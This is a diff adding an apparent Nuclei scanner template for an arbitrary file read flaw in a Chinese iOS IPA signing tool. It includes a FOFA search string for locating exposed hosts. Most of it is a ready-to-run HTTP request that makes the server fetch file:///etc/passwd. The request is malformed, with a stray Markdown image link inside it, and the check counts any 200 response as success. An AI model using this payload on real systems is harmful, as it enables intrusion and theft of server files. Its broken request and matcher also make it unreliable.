@@ -1,0 +1,27 @@
+id: poc-dnzv4h2lcw16vgpo
+info:
+  name: 苹果IOS端IPA签名工具request_post任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dnzv4h2lcw16vgpo'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dnzv4h2lcw16vgpo
+    fofa: body="/assets/index/css/mobileSelect.css"
+http:
+- raw:
+  - 'GET /api/index/request_post?url=file:///etc/passwd&post_data=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1728368343806-5c498c21-87b8-407e-ada4-e500dc66c893.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
